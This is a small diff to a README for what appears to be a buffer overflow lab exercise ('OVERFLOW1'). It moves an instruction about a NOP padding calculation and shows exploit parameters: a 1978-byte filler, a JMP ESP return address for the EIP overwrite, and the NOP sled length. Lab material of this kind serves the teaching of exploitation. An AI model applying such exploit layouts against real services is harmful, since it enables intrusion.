@@ -27,16 +27,14 @@ Update the header for each overflow example... ie. OVERFLOW1 ,OVERFLOW2 , etc
 header = "OVERFLOW1 "
 ```
 
-Adjust the extend on the end of payload to reflect the correct payload (this is not necessary, however it keeps the original BoF intact)
-```python
-extend = "\x90" * (400 - (len(payload_calc) + (len(nop_sled)))
-```
-
 Adjust the filler buffer to enable the overflow, adjust the eip address (JMP ESP)
+
+Change the payload reference for the extend to caclulate the correct end of the buffer after your payload (this is not necessary, however it keeps the original BoF intact)
 
 ```python
 filler = "A" * 1978  # Filler 1978 Bytes + 10 Bytes Header
 eip = "\xaf\x11\x50\x62"    #0x625011af  Return Address JMP ESP
+extend = "\x90" * (400 - (len(payload_calc) + (len(nop_sled)))
 ```
 
 ## Eip Test
